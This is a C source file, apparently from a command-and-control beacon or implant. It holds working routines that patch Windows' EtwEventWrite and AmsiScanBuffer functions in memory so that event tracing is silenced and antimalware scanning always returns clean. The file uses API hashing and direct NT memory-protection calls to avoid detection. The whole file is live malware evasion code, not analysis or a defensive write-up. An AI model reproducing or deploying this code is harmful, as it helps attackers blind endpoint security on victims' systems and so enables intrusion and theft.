// ETW and AMSI patching.
//
// EtwEventWrite: first byte → 0xC3 (ret). Silences all ETW events from this
// process without disabling the provider subscription.
//
// AmsiScanBuffer: xor eax,eax; ret → returns S_OK / AMSI_RESULT_CLEAN.

#include "../core/beacon.h"
#include <winternl.h> // NtCurrentProcess() macro

static void patch_bytes(void* target, const uint8_t* patch, size_t len) {
    DWORD old_prot = 0;
    SIZE_T region  = len;
    PVOID  addr    = target;
    NtProtectVirtualMemory_i(NtCurrentProcess(), &addr, &region,
                             PAGE_EXECUTE_READWRITE, &old_prot);
    rt_memcpy(target, patch, len);
    NtProtectVirtualMemory_i(NtCurrentProcess(), &addr, &region,
                             old_prot, &old_prot);
}

void opsec_patch_etw(void) {
    void* fn = api_resolve(api_hash_w(L"ntdll.dll"),
                           api_hash("EtwEventWrite"));
    if (!fn) return;
    uint8_t patch[] = { 0xC3 }; // ret
    patch_bytes(fn, patch, sizeof(patch));
}

void opsec_patch_amsi(void) {
    // amsi.dll is loaded on demand; skip silently if absent.
    void* fn = api_resolve(api_hash_w(L"amsi.dll"),
                           api_hash("AmsiScanBuffer"));
    if (!fn) return;
    // xor eax, eax; ret → returns S_OK (0) → AMSI_RESULT_CLEAN
    uint8_t patch[] = { 0x31, 0xC0, 0xC3 };
    patch_bytes(fn, patch, sizeof(patch));
}
